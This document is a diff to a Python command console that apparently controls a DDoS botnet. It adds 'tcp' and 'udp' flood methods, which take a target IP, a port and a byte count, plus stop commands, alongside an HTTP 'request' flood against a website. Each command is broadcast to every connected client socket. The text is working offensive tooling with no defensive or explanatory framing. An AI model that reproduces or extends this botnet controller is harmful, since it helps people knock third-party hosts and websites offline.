@@ -44,7 +44,8 @@ help_menu = """\033[90m
 """
 
 methods = """\033[90m
-  -/-\033[35m socket \033[90m -/-
+  -/-\033[35m tcp \033[90m    -/-
+  -/-\033[35m udp \033[90m    -/-
   -/-\033[35m request \033[90m-/-
 """
 
@@ -61,6 +62,8 @@ hostname = socket.gethostname()
 
 local = f"\033[35m[\033[90m{username}@{hostname} \033[90m~\033[35m]\033[96m$ \033[0m"
 remote = local.replace(hostname, "remote")
+
+conn_error = "\033[31m[-]\033[0m You are not connected\n"
 
 s = socket.socket()
 s.bind((host, port))
@@ -125,14 +128,17 @@ def server():
         elif console == "methods":
             print(methods)
 
-        elif console.startswith("socket"):
-            print("\033[31m[-]\033[0m You are not connected\n")
+        elif console.startswith("tcp"):
+            print(conn_error)
+
+        elif console.startswith("udp"):
+            print(conn_error)
 
         elif console.startswith("request"):
-            print("\033[31m[-]\033[0m You are not connected\n")
+            print(conn_error)
 
         elif console == "disconnect":
-            print("\033[31m[-]\033[0m You are not connected\n")
+            print(conn_error)
 
         elif console == "connect":
             if len(sockets) > 0:
@@ -152,13 +158,29 @@ def server():
                     elif console == "methods":
                         print(methods)
 
-                    elif console.startswith("socket"):
+                    elif console.startswith("tcp"):
                         if len(console.split()) == 4:
                             for sock in sockets:
                                 sock.send(console.encode())
 
                         else:
-                            print("Usage: socket <ip> <port> <bytes>\n")
+                            print("tcp <ip> <port> <bytes> | stop tcp\n")
+
+                    elif console.startswith("udp"):
+                        if len(console.split()) == 3:
+                            for sock in sockets:
+                                sock.send(console.encode())
+
+                        else:
+                            print("udp <ip> <bytes> | stop udp\n")
+
+                    elif console == "stop tcp":
+                        for sock in sockets:
+                            sock.send(console.encode())
+
+                    elif console == "stop udp":
+                        for sock in sockets:
+                            sock.send(console.encode())
 
                     elif console.startswith("request"):
                         if len(console.split()) == 3:
@@ -166,7 +188,7 @@ def server():
                                 sock.send(console.encode())
 
                         else:
-                            print("Usage: request <http(s)://website.com> <bytes>\n")
+                            print("request <http(s)://website.com> <bytes>\n")
 
                     elif console == "connect":
                         print("\033[31m[-]\033[0m You are already connected\n")
